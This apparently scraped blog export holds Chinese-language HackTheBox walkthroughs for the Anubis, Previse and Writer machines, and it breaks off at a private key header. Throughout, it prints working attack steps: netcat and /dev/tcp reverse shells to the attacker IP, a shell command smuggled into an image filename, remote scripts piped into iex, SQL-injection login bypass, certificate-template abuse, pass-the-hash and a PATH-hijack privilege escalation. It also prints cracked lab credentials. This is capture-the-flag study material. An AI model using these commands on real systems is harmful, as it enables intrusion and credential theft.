flagexp一键打： 参考资料 Exploiting friends with CVE-2019-18818 – thatsn0tmysitehttps://thatsn0tmysite.wordpress.com/2019/11/15/x05/ Strapi Framework Vulnerable to Remote Code Execution (CVE-2019-19609) :: { bit.therapy }https://bittherapy.net/post/strapi-framework-remote-code-execution/ nth347/CVE-2021-3129_exploit: Exploit for CVE-2021-3129https://github.com/nth347/CVE-2021-3129_exploit HTB Horizontall [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Horizontall-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Anubis - HackTheBox","slug":"Anubis-HackTheBox","date":"2021-08-17T06:58:34.000Z","updated":"2022-12-29T05:26:54.785Z","comments":true,"path":"2021/08/17/Anubis-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/08/17/Anubis-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/371 10.10.11.102 端口扫描443有个域名，加hosts： 1234567891011121314151617181920212223242526272829303132$ nmap -sC -sV 10.10.11.102Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-17 14:06 CSTNmap scan report for 10.10.11.102Host is up (0.070s latency).Not shown: 996 filtered tcp ports (no-response)PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| ssl-cert: Subject: commonName=www.windcorp.htb| Subject Alternative Name: DNS:www.windcorp.htb| Not valid before: 2021-05-24T19:44:56|_Not valid after: 2031-05-24T19:54:56|_ssl-date: 2021-08-17T06:08:04+00:00; 0s from scanner time.|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found| tls-alpn:|_ http/1.1445/tcp open microsoft-ds?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2021-08-17T06:07:29|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 106.49 seconds 443110.10.11.102 www.windcorp.htb 域名访问： Contactcontact输入内容，经过priview.asp，也会写入到test.asp: webshell那如果写入asp代码呢： 可以看到成功解析，可以执行命令： reverse shell通过webshell运行命令加载reverse shell，拿到的容器的system： WEBSERVER01administrator桌面发现一个req.txt ,是一个证书请求，解码得到域名：softwareportal.windcorp.htb 可以猜测这个域名对应网关，在我们的实例中是172.27.112.1： 12curl 172.27.112.1curl 172.27.112.1 -Headers @&#123;\"Host\"=\"softwareportal.windcorp.htb\"&#125; -UseBasicParsing 所以添加hosts, 设置路由和代理： 123456789172.27.112.1 softwareportal.windcorp.htbmeterpreter &gt; run autoroute -s 172.27.112.1/24use auxiliary/server/socks_proxyruncurl --proxy socks5://localhost:1080 172.27.112.1curl --proxy socks5://localhost:1080 softwareportal.windcorp.htb req.txt1234567891011121314151617-----BEGIN CERTIFICATE REQUEST-----MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5kY29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r&#x2F;hZHCKsK&#x2F;BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKbBEHIH2bhGEfCenhILl&#x2F;9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntLeEgNf5l33cbOcHIFm3C92&#x2F;cf2IvjHhaJWb+4a&#x2F;6PgTlcxBMne5OsR+4hc4YIhLnzQMoVUqy7wI3VZ2tjSh6SiiPU4+Vg&#x2F;nvx&#x2F;&#x2F;YNyEas3mjA&#x2F;DSZiczsqDvCNM24YZOqqmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+HJzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2PWW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF&#x2F;MzoR3DpqO5T&#x2F;Dm9gNyOtyKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1FF09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO&#x2F;D5B6JCEE3amuxU04CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso4TlwpQ&#x3D;&#x3D;-----END CERTIFICATE REQUEST----- softwareportal.windcorp.htb通过代理访问softwareportal： 提供一些软件安装，提供的软件链接格式： 1http:&#x2F;&#x2F;softwareportal.windcorp.htb&#x2F;install.asp?client&#x3D;172.27.120.203&amp;software&#x3D;7z1900-x64.exe localadmin如果修改链接中的ip为我们自己的，wireshark抓包能够看到winrm请求，启动responder捕获,得到localadmin的hash，破解出来密码： 123localadmin::windcorp:ad361ec8ab79ef4becret123 SMB使用得到的账号密码枚举smb，可以得到一些omv文件： 123smbclient //10.10.11.102/Shared -U windcorp.htb/localadmin Secret123smb: \\Documents\\Analytics\\&gt; ls .omv似乎与 Jamovi 有关，Jamovi 是上述安装程序之一。还值得注意的是，其中一个文件Whatif.omv的时间戳是今天，而其余文件则有一年多的时间。 Jamovi CVEXSS to RCE： cves/CVE-2021-28079.md at master · theart42/cveshttps://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md omv是zip文件，修改其中内容XSS to RCE，然后再放回smb上等待触发： 1require(&#39;child_process&#39;).spawn(&#39;calc.exe&#39;) 得到windcorp\\diegocruz shell 提权信息diegocruz在webdevelopers组中，枚举信息发现存在ADCS证书服务，并且有一个我们可控的证书模板 ADCS cfalta/PoshADCS: A proof of concept on attack vectors against Active Directory by abusing Active Directory Certificate Services (ADCS)https://github.com/cfalta/PoshADCS 1234567891011121314curl http://10.10.14.6/Rubeus.exe -outfile \\programdata\\rubeus.execurl http://10.10.14.6/PowerView.ps1 | iexcurl http://10.10.14.6/ADCS.ps1 | iex# 生成证书Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose# 获取证书信息gci cert:\\currentuser\\my -recurse# 获取TGT以及NTLM.\\rubeus.exe asktgt /user:Administrator /getcredentials /certificate:1C7115A30632E82A04A7341797597564272479653CCC18280610C6CA3156F995B5899E09 提权 &amp; flags(基本整篇云的，当时做的时候用的非预期，现在参考预期云一遍) 然后使用得到的hash PTH登录administrator： 1python3 ~/Tools/impacket/examples/psexec.py -hashes :3CCC18280610C6CA3156F995B5899E09 administrator@10.10.11.102 参考资料 cves/CVE-2021-28079.md at master · theart42/cveshttps://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md cfalta/PoshADCS: A proof of concept on attack vectors against Active Directory by abusing Active Directory Certificate Services (ADCS)https://github.com/cfalta/PoshADCS https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp HTB Anubis Discussion | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Anubis-Discussion HTB: Anubis | 0xdf hacks stuffhttps://0xdf.gitlab.io/2022/01/29/htb-anubis.html#root-step-with-alternative-tools","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Previse - HackTheBox","slug":"Previse-HackTheBox","date":"2021-08-11T08:18:04.000Z","updated":"2022-01-10T06:16:14.654Z","comments":true,"path":"2021/08/11/Previse-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/08/11/Previse-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/373 10.10.11.104 端口扫描22和80: 123456789101112131415161718192021222324$ nmap -sC -sV 10.10.11.104Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-11 15:01 CSTNmap scan report for 10.10.11.104Host is up (0.069s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)|_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Previse Login|_Requested resource was login.php| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not setService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 33.59 seconds 80 目录扫描1234567891011121314151617gobuster dir -u http://10.10.11.104/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/accounts.php (Status: 302) [Size: 3994] [--&gt; login.php]/config.php (Status: 200) [Size: 0]/css (Status: 301) [Size: 310] [--&gt; http://10.10.11.104/css/]/download.php (Status: 302) [Size: 0] [--&gt; login.php]/favicon.ico (Status: 200) [Size: 15406]/files.php (Status: 302) [Size: 4914] [--&gt; login.php]/footer.php (Status: 200) [Size: 217]/header.php (Status: 200) [Size: 980]/index.php (Status: 302) [Size: 2801] [--&gt; login.php]/js (Status: 301) [Size: 309] [--&gt; http://10.10.11.104/js/]/login.php (Status: 200) [Size: 2224]/logout.php (Status: 302) [Size: 0] [--&gt; login.php]/logs.php (Status: 302) [Size: 0] [--&gt; login.php]/server-status (Status: 403) [Size: 277]/status.php (Status: 302) [Size: 2966] [--&gt; login.php] accounts.php任意请求都是跳转到login，但根据burp记录，可以看到页面内容，只是遵循响应302跳转，尝试拦截修改响应，可以正常访问： files创建账号，登录，files里发现一个备份文件： siteBackup下载解压，查看文件,其中config里可以得到数据库密码，logs里发现exec拼接参数，可以命令注入： config.php123456789101112&lt;?phpfunction connectDB()&#123; $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon;&#125;?&gt; logs.php1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpsession_start();if (!isset($_SESSION['user'])) &#123; header('Location: login.php'); exit;&#125;?&gt;&lt;?phpif (!$_SERVER['REQUEST_METHOD'] == 'POST') &#123; header('Location: login.php'); exit;&#125;///////////////////////////////////////////////////////////////////////////////////////I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER///////////////////////////////////////////////////////////////////////////////////////$output = exec(\"/usr/bin/python /opt/scripts/log_process.py &#123;$_POST['delim']&#125;\");echo $output;$filepath = \"/var/www/out.log\";$filename = \"out.log\";if(file_exists($filepath)) &#123; header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"'.basename($filepath).'\"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($filepath)); ob_clean(); // Discard data in the output buffer flush(); // Flush system headers readfile($filepath); die();&#125; else &#123; http_response_code(404); die();&#125;?&gt; 命令注入logs就是网页上的LOG DATA功能，命令注入getshell： 1comma;rm%20&#x2F;tmp&#x2F;f;mkfifo%20&#x2F;tmp&#x2F;f;cat%20&#x2F;tmp&#x2F;f%7C&#x2F;bin&#x2F;sh%20-i%202%3E%261%7Cnc%2010.10.14.7%204444%20%3E&#x2F;tmp&#x2F;f mysql使用前面config里得到的mysql账号密码查看数据,可以得到m4lwhere账号密码： 123456789101112131415161718192021222324252627282930313233343536373839mysql&gt; use previseuse previseReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;show tables;+-------------------+| Tables_in_previse |+-------------------+| accounts || files |+-------------------+2 rows in set (0.00 sec)mysql&gt; desc accounts;desc accounts;+------------+--------------+------+-----+-------------------+----------------+| Field | Type | Null | Key | Default | Extra |+------------+--------------+------+-----+-------------------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | varchar(50) | NO | UNI | NULL | || password | varchar(255) | NO | | NULL | || created_at | datetime | YES | | CURRENT_TIMESTAMP | |+------------+--------------+------+-----+-------------------+----------------+4 rows in set (0.01 sec)mysql&gt; select username,password from accounts;select username,password from accounts;+----------+------------------------------------+| username | password |+----------+------------------------------------+| m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. || miaomiao | $1$🧂llol$utY3ViR6xEFtKTaHwL.tn0 |+----------+------------------------------------+2 rows in set (0.00 sec)mysql&gt; hash crack破解出来密码,密码在rockyou的中间位置(51.68%左右)，需要花费一点时间： 123sudo hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! user flagm4lwhere ssh登录，得到user.txt: 1m4lwhere : ilovecody112235! 提权信息可以Sudo运行一个脚本，里面调用gzip，没有使用绝对路径，可以环境变量劫持： Linux Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-command-suid-binary-without-command-path Payloads to execute - HackTrickshttps://book.hacktricks.xyz/linux-unix/privilege-escalation/payloads-to-execute 提权 &amp; root flag12345678910m4lwhere@previse:/tmp$ nano gzipm4lwhere@previse:/tmp$ cat gzip#!/bin/bashcp /bin/bash /tmp/b &amp;&amp; chmod +s /tmp/bm4lwhere@previse:/tmp$ chmod +x gzipm4lwhere@previse:/tmp$ export PATH=/tmp:$PATHm4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.shm4lwhere@previse:/tmp$ ls -al b-rwsr-sr-x 1 root root 1113504 Aug 11 08:11 bm4lwhere@previse:/tmp$ ./b -p 参考资料 Linux Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-command-suid-binary-without-command-path Payloads to execute - HackTrickshttps://book.hacktricks.xyz/linux-unix/privilege-escalation/payloads-to-execute HTB [Previse] Discussion | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Previse-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Writer - HackTheBox","slug":"Writer-HackTheBox","date":"2021-08-06T06:02:04.000Z","updated":"2021-12-13T05:44:02.123Z","comments":true,"path":"2021/08/06/Writer-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/08/06/Writer-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/361 10.10.11.101 端口扫描22,80,139,445: 123456789101112131415161718192021222324252627282930$ nmap -sC -sV 10.10.11.101Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 09:32 CSTNmap scan report for 10.10.11.101Host is up (0.068s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)| 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)|_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Story Bank | Writer.HTB139/tcp open netbios-ssn Samba smbd 4.6.2445/tcp open netbios-ssn Samba smbd 4.6.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-08-06T01:32:41|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.36 seconds 80一个blog： 目录扫描目录扫描用大点的字典发现管理目录： 123456789gobuster dir -u http://10.10.11.101/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/contact (Status: 200) [Size: 4905]/about (Status: 200) [Size: 3522]/static (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/]/logout (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]/dashboard (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]/administrative (Status: 200) [Size: 1443]/server-status (Status: 403) [Size: 277] administrative SQL注入登录sql注入,万能密码登录： 1admin&#39;or&#39;1&#39;&#x3D;&#39;1 常规手注，union可以发现第二列回显： 可以利用load_file读文件： apache配置文件默认路径，读取apache配置文件，发现WSGI,后面就是一步步读文件： 1&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf writer.wsgi/var/www/writer.htb/writer.wsgi 12345678910111213#!/usr/bin/pythonimport sysimport loggingimport randomimport os# Define logginglogging.basicConfig(stream=sys.stderr)sys.path.insert(0,\"/var/www/writer.htb/\")# Import the __init__.py from the app folderfrom writer import app as applicationapplication.secret_key = os.environ.get(\"SECRET_KEY\", \"\") init.py/var/www/writer.htb/writer/__init__.py Init.py里得到数据库密码，并且代码里可以发现调用system处理图片，这里可以在文件名里进行命令注入：from flask import Flask, session, redirect, url_for, request, render_templatefrom mysql.connector import errorcodeimport mysql.connectorimport urllib.requestimport osimport PILfrom PIL import Image, UnidentifiedImageErrorimport hashlibapp = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')#Define connection for databasedef connections(): try: connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer') return connector except mysql.connector.Error as err: if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: return (\"Something is wrong with your db user name or password!\") elif err.errno == errorcode.ER_BAD_DB_ERROR: return (\"Database does not exist\") else: return (\"Another exception, returning!\") else: print ('Connection to DB is ready!')#Define homepage@app.route('/')def home_page(): try: connector = connections() except mysql.connector.Error as err: return (\"Database error\") cursor = connector.cursor() sql_command = \"SELECT * FROM stories;\" cursor.execute(sql_command) results = cursor.fetchall() return render_template('blog/blog.html', results=results)#Define about page@app.route('/about')def about(): return render_template('blog/about.html')#Define contact page@app.route('/contact')def contact(): return render_template('blog/contact.html')#Define blog posts@app.route('/blog/post/&lt;id&gt;', methods=['GET'])def blog_post(id): try: connector = connections() except mysql.connector.Error as err: return (\"Database error\") cursor = connector.cursor() cursor.execute(\"SELECT * FROM stories WHERE id = %(id)s;\", &#123;'id': id&#125;) results = cursor.fetchall() sql_command = \"SELECT * FROM stories;\" cursor.execute(sql_command) stories = cursor.fetchall() return render_template('blog/blog-single.html', results=results, stories=stories)#Define dashboard for authenticated users@app.route('/dashboard')def dashboard(): if not ('user' in session): return redirect('/') return render_template('dashboard.html')#Define stories page for dashboard and edit/delete pages@app.route('/dashboard/stories')def stories(): if not ('user' in session): return redirect('/') try: connector = connections() except mysql.connector.Error as err: return (\"Database error\") cursor = connector.cursor() sql_command = \"Select * From stories;\" cursor.execute(sql_command) results = cursor.fetchall() return render_template('stories.html', results=results)@app.route('/dashboard/stories/add', methods=['GET', 'POST'])def add_story(): if not ('user' in session): return redirect('/') try: connector = connections() except mysql.connector.Error as err: return (\"Database error\") if request.method == \"POST\": if request.files['image']: image = request.files['image'] if \".jpg\" in image.filename: path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename) image.save(path) image = \"/img/&#123;&#125;\".format(image.filename) else: error = \"File extensions must be in .jpg!\" return render_template('add.html', error=error) if request.form.get('image_url'): image_url = request.form.get('image_url') if \".jpg\" in image_url: try: local_filename, headers = urllib.request.urlretrieve(image_url) os.system(\"mv &#123;&#125; &#123;&#125;.jpg\".format(local_filename, local_filename)) image = \"&#123;&#125;.jpg\".format(local_filename) try: im = Image.open(image) im.verify() im.close() image = image.replace('/tmp/','') os.system(\"mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;\".format(image, image)) image = \"/img/&#123;&#125;\".format(image) except PIL.UnidentifiedImageError: os.system(\"rm &#123;&#125;\".format(image)) error = \"Not a valid image file!\" return render_template('add.html', error=error) except: error = \"Issue uploading picture\" return render_template('add.html', error=error) else: error = \"File extensions must be in .jpg!\" return render_template('add.html', error=error) author = request.form.get('author') title = request.form.get('title') tagline = request.form.get('tagline') content = request.form.get('content') cursor = connector.cursor() cursor.execute(\"INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);\", &#123;'author':author,'title': title,'tagline': tagline,'content': content, 'image':image &#125;) result = connector.commit() return redirect('/dashboard/stories') else: return render_template('add.html')@app.route('/dashboard/stories/edit/&lt;id&gt;', methods=['GET', 'POST'])def edit_story(id): if not ('user' in session): return redirect('/') try: connector = connections() except mysql.connector.Error as err: return (\"Database error\") if request.method == \"POST\": cursor = connector.cursor() cursor.execute(\"SELECT * FROM stories where id = %(id)s;\", &#123;'id': id&#125;) results = cursor.fetchall() if request.files['image']: image = request.files['image'] if \".jpg\" in image.filename: path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename) image.save(path) image = \"/img/&#123;&#125;\".format(image.filename) cursor = connector.cursor() cursor.execute(\"UPDATE stories SET image = %(image)s WHERE id = %(id)s\", &#123;'image':image, 'id':id&#125;) result = connector.commit() else: error = \"File extensions must be in .jpg!\" return render_template('edit.html', error=error, results=results, id=id) if request.form.get('image_url'): image_url = request.form.get('image_url') if \".jpg\" in image_url: try: local_filename, headers = urllib.request.urlretrieve(image_url) os.system(\"mv &#123;&#125; &#123;&#125;.jpg\".format(local_filename, local_filename)) image = \"&#123;&#125;.jpg\".format(local_filename) try: im = Image.open(image) im.verify() im.close() image = image.replace('/tmp/','') os.system(\"mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;\".format(image, image)) image = \"/img/&#123;&#125;\".format(image) cursor = connector.cursor() cursor.execute(\"UPDATE stories SET image = %(image)s WHERE id = %(id)s\", &#123;'image':image, 'id':id&#125;) result = connector.commit() except PIL.UnidentifiedImageError: os.system(\"rm &#123;&#125;\".format(image)) error = \"Not a valid image file!\" return render_template('edit.html', error=error, results=results, id=id) except: error = \"Issue uploading picture\" return render_template('edit.html', error=error, results=results, id=id) else: error = \"File extensions must be in .jpg!\" return render_template('edit.html', error=error, results=results, id=id) title = request.form.get('title') tagline = request.form.get('tagline') content = request.form.get('content') cursor = connector.cursor() cursor.execute(\"UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s\", &#123;'title':title, 'tagline':tagline, 'content':content, 'id': id&#125;) result = connector.commit() return redirect('/dashboard/stories') else: cursor = connector.cursor() cursor.execute(\"SELECT * FROM stories where id = %(id)s;\", &#123;'id': id&#125;) results = cursor.fetchall() return render_template('edit.html', results=results, id=id)@app.route('/dashboard/stories/delete/&lt;id&gt;', methods=['GET', 'POST'])def delete_story(id): if not ('user' in session): return redirect('/') try: connector = connections() except mysql.connector.Error as err: return (\"Database error\") if request.method == \"POST\": cursor = connector.cursor() cursor.execute(\"DELETE FROM stories WHERE id = %(id)s;\", &#123;'id': id&#125;) result = connector.commit() return redirect('/dashboard/stories') else: cursor = connector.cursor() cursor.execute(\"SELECT * FROM stories where id = %(id)s;\", &#123;'id': id&#125;) results = cursor.fetchall() return render_template('delete.html', results=results, id=id)#Define user page for dashboard@app.route('/dashboard/users')def users(): if not ('user' in session): return redirect('/') try: connector = connections() except mysql.connector.Error as err: return \"Database Error\" cursor = connector.cursor() sql_command = \"SELECT * FROM users;\" cursor.execute(sql_command) results = cursor.fetchall() return render_template('users.html', results=results)#Define settings page@app.route('/dashboard/settings', methods=['GET'])def settings(): if not ('user' in session): return redirect('/') try: connector = connections() except mysql.connector.Error as err: return \"Database Error!\" cursor = connector.cursor() sql_command = \"SELECT * FROM site WHERE id = 1\" cursor.execute(sql_command) results = cursor.fetchall() return render_template('settings.html', results=results)#Define authentication mechanism@app.route('/administrative', methods=['POST', 'GET'])def login_page(): if ('user' in session): return redirect('/dashboard') if request.method == \"POST\": username = request.form.get('uname') password = request.form.get('password') password = hashlib.md5(password.encode('utf-8')).hexdigest() try: connector = connections() except mysql.connector.Error as err: return (\"Database error\") try: cursor = connector.cursor() sql_command = \"Select * From users Where username = '%s' And password = '%s'\" % (username, password) cursor.execute(sql_command) results = cursor.fetchall() for result in results: print(\"Got result\") if result and len(result) != 0: session['user'] = username return render_template('success.html', results=results) else: error = \"Incorrect credentials supplied\" return render_template('login.html', error=error) except: error = \"Incorrect credentials supplied\" return render_template('login.html', error=error) else: return render_template('login.html')@app.route(\"/logout\")def logout(): if not ('user' in session): return redirect('/') session.pop('user') return redirect('/')if __name__ == '__main__': app.run(\"0.0.0.0\") 命令注入根据代码逻辑，文件校验只需要文件名中存在.jpg即可，所以可以使用恶意文件名： 1234echo -n \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1'\" | base64YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMSctouch '1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMSc= | base64 -d | bash `;' 根据代码是需要在image_url处触发，上传可以发现在static目录里，所以可以使用file协议，image_url里使用恶意文件名，触发，得到www shell: mysql前面得到的数据库账号密码只能连接writer，根据信息还有个dev： 1mysql -h 127.0.0.1 -u admin -pToughPasswordToCrack -D writer 读配置文件，可以发现dev的djangouser账号密码： 12345[client]database &#x3D; devuser &#x3D; djangouserpassword &#x3D; DjangoSuperPassworddefault-character-set &#x3D; utf8 devdev数据库里获取信息 12345678910mysql -h 127.0.0.1 -u djangouser -pDjangoSuperPassword MariaDB [dev]&gt; SELECT * FROM auth_user;SELECT * FROM auth_user;+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+| id | password | last_login | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined |+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+| 1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A&#x3D; | NULL | 1 | kyle | | | kyle@writer.htb | 1 | 1 | 2021-05-19 12:41:37.168368 |+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+1 row in set (0.000 sec) hash crack根据hash破解出来kyle用户密码： 12345sudo hashcat -a 0 -m 10000 hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txtpbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A&#x3D;:marcoantoniomarcoantonio user flag得到的密码ssh登录，user.txt: disclaimer to John运行pspy64，可以发现disclaimer以及定时的apt update： 这个文件filter组可写，当前kyle用户在filter组里： 这个脚本应该是发送邮件时会被调用，所以可以尝试在里面添加恶意代码,然后发送邮件触发，打到john shell,后续可以直接使用私钥登录john： /etc/postfix/disclaimer1234567891011121314151617181920212223242526272829303132333435#!/bin/sh# Localize these.INSPECT_DIR=/var/spool/filterSENDMAIL=/usr/sbin/sendmail# Get disclaimer addressesDISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses# Exit codes from &lt;sysexits.h&gt;EX_TEMPFAIL=75EX_UNAVAILABLE=69# Clean up when done or when aborting.trap \"rm -f in.$$\" 0 1 2 3 15# Start processing.cd $INSPECT_DIR || &#123; echo $INSPECT_DIR does not exist; exit$EX_TEMPFAIL; &#125;cat &gt;in.$$ || &#123; echo Cannot save mail to file; exit $EX_TEMPFAIL; &#125;# obtain From addressfrom_address=`grep -m 1 \"From:\" in.$$ | cut -d \"&lt;\" -f 2 | cut -d \"&gt;\" -f 1`if [ `grep -wi ^$&#123;from_address&#125;$ $&#123;DISCLAIMER_ADDRESSES&#125;` ]; then /usr/bin/altermime --input=in.$$ \\ --disclaimer=/etc/postfix/disclaimer.txt \\ --disclaimer-html=/etc/postfix/disclaimer.txt \\ --xheader=\"X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm\" || \\ &#123; echo Message content rejected; exit $EX_UNAVAILABLE; &#125;fi$SENDMAIL \"$@\" &lt;in.$$exit $? sendmail.py123456789101112131415161718192021#!/usr/bin/env python3 import smtplibhost = '127.0.0.1' port = 25From = 'kyle@writer.htb' To = 'john@writer.htb'Message = '''\\Subject: HI THERE! JOHNOOPS I GOT YOU MATE. '''try: io = smtplib.SMTP(host,port) io.ehlo() io.sendmail(From,To,Message) except Exceptions as e: print (e) finally: io.quit() John id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE 